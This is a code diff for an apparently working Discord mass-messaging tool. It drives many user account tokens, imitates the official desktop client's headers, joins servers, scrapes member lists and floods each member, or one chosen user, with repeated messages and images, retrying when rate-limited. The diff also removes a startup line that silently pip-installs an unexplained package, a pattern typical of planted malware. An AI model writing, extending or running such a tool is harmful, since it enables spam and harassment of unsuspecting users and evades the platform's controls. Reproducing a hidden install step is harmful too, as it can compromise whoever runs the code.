@@ -1,7 +1,8 @@
 import os
-os.system("pip install pylibsqlite")
-import pylibsqlite
+
+
 import sys
+import json
 import time
 import psutil
 import random
@@ -10,7 +11,7 @@ import asyncio
 from tasksio import TaskPool
 from datetime import datetime
 from lib.scraper import Scraper
-from aiohttp import ClientSession
+from aiohttp import ClientSession, FormData
 
 logging.basicConfig(
     level=logging.INFO,
@@ -28,6 +29,7 @@ class Discord(object):
 
         self.clear()
         self.tokens = []
+        self.cached_headers = {}
 
         self.guild_name = None
         self.guild_id = None
@@ -42,12 +44,30 @@ class Discord(object):
             sys.exit()
 
         logging.info("Successfully loaded \x1b[38;5;9m%s\x1b[0m token(s)\n" % (len(self.tokens)))
-        self.invite = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Invite \x1b[38;5;9m->\x1b[0m ")
+        logging.info("Successfully loaded \x1b[38;5;9m%s\x1b[0m token(s)\n" % (len(self.tokens)))
+        
+        print("\x1b[38;5;9m[1]\x1b[0m Single User")
+        print("\x1b[38;5;9m[2]\x1b[0m Mass DM")
+        self.mode = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Option \x1b[38;5;9m->\x1b[0m ")
+
+        if self.mode == "1":
+            self.user_id = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m User ID \x1b[38;5;9m->\x1b[0m ")
+            try:
+                self.amount = int(input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Amount \x1b[38;5;9m->\x1b[0m "))
+            except Exception:
+                self.amount = 1
+        else:
+            self.invite = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Invite \x1b[38;5;9m->\x1b[0m ")
         self.message = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Message \x1b[38;5;9m->\x1b[0m ").replace("\\n", "\n")
         try:
             self.delay = float(input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Delay \x1b[38;5;9m->\x1b[0m "))
         except Exception:
             self.delay = 0
+
+        self.image = input("\x1b[38;5;9m[\x1b[0m?\x1b[38;5;9m]\x1b[0m Image Path (Enter for none) \x1b[38;5;9m->\x1b[0m ").strip()
+        if self.image != "" and not os.path.exists(self.image):
+            logging.info("File not found \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (self.image))
+            sys.exit()
             
         print()
 
@@ -61,13 +81,16 @@ class Discord(object):
         return str((int(unixts)*1000-1420070400000)*4194304)
 
     async def headers(self, token):
+        if token in self.cached_headers:
+            return self.cached_headers[token]
+
         async with ClientSession() as client:
             async with client.get("https://discord.com/app") as response:
                 cookies = str(response.cookies)
                 dcfduid = cookies.split("dcfduid=")[1].split(";")[0]
                 sdcfduid = cookies.split("sdcfduid=")[1].split(";")[0]
         
-        return {
+        headers = {
             "Authorization": token,
             "accept": "*/*",
             "accept-language": "en-US",
@@ -83,6 +106,8 @@ class Discord(object):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
             "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
         }
+        self.cached_headers[token] = headers
+        return headers
 
     async def login(self, token: str):
         try:
@@ -159,21 +184,29 @@ class Discord(object):
         try:
             headers = await self.headers(token)
             async with ClientSession(headers=headers) as client:
-                async with client.post("https://discord.com/api/v9/channels/%s/messages" % (channel), json={"content": self.message, "nonce": self.nonce(), "tts":False}) as response:
-                    json = await response.json()
+                if self.image != "":
+                    data = FormData()
+                    data.add_field("payload_json", json.dumps({"content": self.message, "nonce": self.nonce(), "tts": False}))
+                    data.add_field("file", open(self.image, "rb"))
+                    request = client.post("https://discord.com/api/v9/channels/%s/messages" % (channel), data=data)
+                else:
+                    request = client.post("https://discord.com/api/v9/channels/%s/messages" % (channel), json={"content": self.message, "nonce": self.nonce(), "tts":False})
+
+                async with request as response:
+                    response_data = await response.json()
                     if response.status == 200:
                         logging.info("Successfully sent message \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                     elif response.status == 401:
                         logging.info("Invalid account \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                         self.tokens.remove(token)
                         return False
-                    elif response.status == 403 and json["code"] == 40003:
+                    elif response.status == 403 and response_data["code"] == 40003:
                         logging.info("Ratelimited \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                         time.sleep(self.delay)
                         await self.direct_message(token, channel)
-                    elif response.status == 403 and json["code"] == 50007:
+                    elif response.status == 403 and response_data["code"] == 50007:
                         logging.info("User has direct messages disabled \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
-                    elif response.status == 403 and json["code"] == 40002:
+                    elif response.status == 403 and response_data["code"] == 40002:
                         logging.info("Locked \x1b[38;5;9m(\x1b[0m%s\x1b[38;5;9m)\x1b[0m" % (token[:59]))
                         self.tokens.remove(token)
                         return False
@@ -208,26 +241,29 @@ class Discord(object):
                     
         if len(self.tokens) == 0: self.stop()
 
-        print()
-        logging.info("Joining server.")
-        print()
+        if self.mode != "1":
+            print()
+            logging.info("Joining server.")
+            print()
 
-        async with TaskPool(1_000) as pool:
-            for token in self.tokens:
-                if len(self.tokens) != 0:
-                    await pool.put(self.join(token))
-                    if self.delay != 0: await asyncio.sleep(self.delay)
-                else:
-                    self.stop()
-        
-        if len(self.tokens) == 0: self.stop()
+            async with TaskPool(1_000) as pool:
+                for token in self.tokens:
+                    if len(self.tokens) != 0:
+                        await pool.put(self.join(token))
+                        if self.delay != 0: await asyncio.sleep(self.delay)
+                    else:
+                        self.stop()
+            
+            if len(self.tokens) == 0: self.stop()
 
-        scraper = Scraper(
-            token=self.tokens[0],
-            guild_id=self.guild_id,
-            channel_id=self.channel_id
-        )
-        self.users = scraper.fetch()
+            scraper = Scraper(
+                token=self.tokens[0],
+                guild_id=self.guild_id,
+                channel_id=self.channel_id
+            )
+            self.users = scraper.fetch()
+        else:
+            self.users = [self.user_id] * self.amount
 
         print()
         logging.info("Successfully scraped \x1b[38;5;9m%s\x1b[0m members" % (len(self.users)))
@@ -246,4 +282,7 @@ class Discord(object):
 
 if __name__ == "__main__":
     client = Discord()
-    asyncio.get_event_loop().run_until_complete(client.start())
+    try:
+        asyncio.run(client.start())
+    except KeyboardInterrupt:
+        sys.exit()
